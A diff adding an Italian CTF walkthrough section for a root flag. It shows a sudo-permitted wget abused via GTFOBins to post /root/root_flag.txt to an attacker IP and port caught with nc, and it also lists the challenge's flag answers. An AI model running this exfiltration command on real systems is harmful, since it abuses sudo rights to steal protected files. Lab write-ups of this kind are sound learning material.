@@ -36,4 +36,21 @@ _________
 
 - una volta eseguito l'accesso nella directory Documents troviamo la prima flag
 
-      Answer: 057c67131c3d5e42dd5cd3075b198ff6 
+      Answer: 057c67131c3d5e42dd5cd3075b198ff6
+
+# Root flag
+
+- digitando il comando _sudo -l_ non ci viene richiesta la password dell'utente e ci viene fornita un'informazione utile per eseguire privilege escalation
+
+![5](https://github.com/Manganaccio/Manganaccio/assets/137283468/344cbadb-4511-416c-b5b5-10aeb47c1f2c)
+
+- navighiamo ora su GTFOBins e alla pagina _wget_ all'indicazione _File upload_ ci vengono forniti i comandi da eseguire sul terminale
+- apriamo quindi una connessione nc sulla macchina attaccante e contemporaneamente ottenuto su GTFOBins
+- eseguire sulla macchina vittima il comando _sudo /usr/bin/wget --post-file=/root/root_flag.txt http://'NOSTRO-IP':'PORTA'_ e contemporaneamente apriamo una connessione nc sulla macchina attaccante
+
+![6](https://github.com/Manganaccio/Manganaccio/assets/137283468/03b8e818-f657-47e4-ad0c-c26216f39a77)
+
+![7](https://github.com/Manganaccio/Manganaccio/assets/137283468/0df03445-046f-41b1-9d90-98dbb5d1ac5c)
+
+
+      Answer: b1b968b37519ad1daa6408188649263d
